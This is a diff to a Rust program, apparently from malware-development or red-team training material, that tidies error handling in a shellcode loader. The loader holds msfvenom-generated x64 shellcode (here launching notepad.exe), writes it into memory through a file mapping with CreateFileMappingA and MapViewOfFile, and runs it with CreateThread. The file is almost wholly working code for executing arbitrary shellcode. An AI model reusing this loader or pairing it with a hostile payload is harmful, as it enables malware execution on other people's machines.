@@ -1,4 +1,4 @@
-use std::ptr::copy;
+use std::ptr::copy_nonoverlapping;
 use windows::Win32::{
     Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
     System::{
@@ -10,8 +10,7 @@ use windows::Win32::{
     },
 };
 
-fn main() {
-    
+fn main() -> Result<(), Box<dyn std::error::Error>> {
     // msfvenom -p windows/x64/exec CMD=notepad.exe -f rust
     let shellcode: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -43,9 +42,7 @@ fn main() {
             0,
             shellcode.len() as u32,
             None,
-        ).unwrap_or_else(|e| {
-            panic!("[!] CreateFileMappingA Failed With Error: {e}");
-        });
+        )?;
 
         println!("[+] Mapping the file object");
         let map_address = MapViewOfFile(
@@ -56,7 +53,7 @@ fn main() {
             shellcode.len(),
         );
 
-        copy(shellcode.as_ptr() as _, map_address.Value, shellcode.len());
+        copy_nonoverlapping(shellcode.as_ptr().cast(), map_address.Value, shellcode.len());
 
         println!("[+] Creating a thread");
         let hthread = CreateThread(
@@ -66,14 +63,13 @@ fn main() {
             None,
             THREAD_CREATION_FLAGS(0),
             None,
-        ).unwrap_or_else(|e| {
-            panic!("[!] CreateThread Failed With Error: {e}");
-        });
+        )?;
 
         println!("[+] Thread Executed!!");
 
         WaitForSingleObject(hthread, INFINITE);
-
-        CloseHandle(hthread);
+        CloseHandle(hthread)?;
     }
+    
+    Ok(())
 }
